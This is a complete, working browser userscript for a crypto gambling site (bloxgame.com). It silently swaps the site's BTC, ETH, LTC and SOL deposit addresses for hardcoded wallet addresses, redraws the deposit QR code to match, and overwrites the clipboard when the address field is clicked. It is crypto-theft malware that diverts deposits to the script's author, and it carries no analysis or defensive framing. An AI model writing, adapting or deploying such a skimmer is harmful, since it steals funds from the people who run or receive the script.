// ==UserScript==
// @name         1234
// @namespace    http://tampermonkey.net/
// @version      4.1
// @description
// @author
// @match        https://bloxgame.com/*
// @grant        none
// @require      https://cdnjs.cloudflare.com/ajax/libs/qrious/4.0.2/qrious.min.js
// ==/UserScript==

(function () {
    'use strict';

    const modalSelector = 'body > div:nth-child(10) > div > div';
    const selectedCryptoSelector = '.modals_option__sKRqu.modals_selected__YMFss';
    const inputSelector = '.input_input__N_xjH.input_inputWithCurrency__8asLR';
    const qrCodeSvgContainerSelector = 'body > div:nth-child(10) > div > div > div.modals_modalDepositOptionsList__Ni8TO.modals_secondary__kWF9i > div:nth-child(2) > div > div > div';
    const newAddresses = {
        btc: 'bc1qtdfwn7vrktyjxyku9k3mj84nrrscehfcu2rn8s',
        eth: '0x68210d4f213697A380622F8F361B112BA8903C67',
        ltc: 'LUDc7Kfb3KwkXnQvCfH5PfkEhHgG7uXxhg',
        sol: '71Xh1uGSGcfjDVW4HrJAKhrXSTopzB3Pk3H3jS4tMcZb',
    };

    let previousCrypto = null;

    // Fallback for dynamically loading QRious if not available
    function ensureQRious(callback) {
        if (typeof QRious === 'undefined') {
            console.log('[INFO] QRious is not defined. Loading dynamically...');
            const script = document.createElement('script');
            script.src = 'https://cdnjs.cloudflare.com/ajax/libs/qrious/4.0.2/qrious.min.js';
            script.onload = () => {
                console.log('[INFO] QRious dynamically loaded.');
                callback();
            };
            script.onerror = () => {
                console.error('[ERROR] Failed to load QRious.');
            };
            document.head.appendChild(script);
        } else {
            console.log('[INFO] QRious is already loaded.');
            callback();
        }
    }

    const detectSelectedCrypto = (modalContainer) => {
        const selectedOption = modalContainer.querySelector(selectedCryptoSelector);
        if (!selectedOption) return null;

        const textContent = selectedOption.querySelector('span')?.textContent?.toLowerCase();
        if (textContent.includes('bitcoin')) return 'btc';
        if (textContent.includes('ethereum')) return 'eth';
        if (textContent.includes('litecoin')) return 'ltc';
        if (textContent.includes('solana')) return 'sol';

        return null;
    };

    const updateAddressField = (cryptoKey, inputElement) => {
        if (!cryptoKey || !inputElement) return;

        const newAddress = newAddresses[cryptoKey];
        if (newAddress && inputElement.value !== newAddress) {
            inputElement.value = newAddress;
            console.log(`[INFO] Updated ${cryptoKey.toUpperCase()} address to: ${newAddress}`);
        }
    };

    const updateQrCode = (cryptoKey) => {
        const qrSvgContainer = document.querySelector(qrCodeSvgContainerSelector);
        if (!qrSvgContainer) {
            console.error('[ERROR] QR code container not found.');
            return;
        }

        // Remove existing QR code
        qrSvgContainer.innerHTML = '';

        // Generate and insert a new QR code
        const newAddress = newAddresses[cryptoKey];
        if (newAddress) {
            const canvas = document.createElement('canvas');
            new QRious({
                element: canvas,
                value: newAddress,
                size: 124, // Set QR code size
            });

            qrSvgContainer.appendChild(canvas);
            console.log(`[INFO] Updated QR code for ${cryptoKey.toUpperCase()} to match the new address.`);
        } else {
            console.error('[ERROR] Address is invalid.');
        }
    };

    const attachCopyFunction = (cryptoKey, inputElement) => {
        const newAddress = newAddresses[cryptoKey];
        if (!cryptoKey || !newAddress) return;

        inputElement.addEventListener(
            'click',
            () => {
                setTimeout(() => {
                    navigator.clipboard
                        .writeText(newAddress)
                        .then(() => {
                            console.log(`[INFO] Custom copy for ${cryptoKey.toUpperCase()} address: ${newAddress}`);
                            alert('Crypto address copied to clipboard!');
                        })
                        .catch((err) => console.error(`[ERROR] Failed to copy ${cryptoKey.toUpperCase()} address: ${err}`));
                }, 800); // Wait for the website's copy behavior
            },
            { once: true }
        );
    };

    const monitorModal = () => {
        const modalContainer = document.querySelector(modalSelector);

        if (modalContainer) {
            const inputElement = modalContainer.querySelector(inputSelector);
            const selectedCrypto = detectSelectedCrypto(modalContainer);

            if (selectedCrypto && inputElement) {
                if (selectedCrypto !== previousCrypto) {
                    console.log(`[INFO] Detected selected cryptocurrency: ${selectedCrypto}`);
                    updateAddressField(selectedCrypto, inputElement);
                    updateQrCode(selectedCrypto);
                    attachCopyFunction(selectedCrypto, inputElement);
                    previousCrypto = selectedCrypto;
                }
            } else {
                console.log('[DEBUG] No cryptocurrency detected or input field missing.');
            }
        } else {
            console.log('[DEBUG] Modal container not found. Retrying...');
        }
    };

    console.log('[INFO] Starting modal monitoring...');
    ensureQRious(() => {
        setInterval(monitorModal, 500); // Check every 500ms
    });
})();
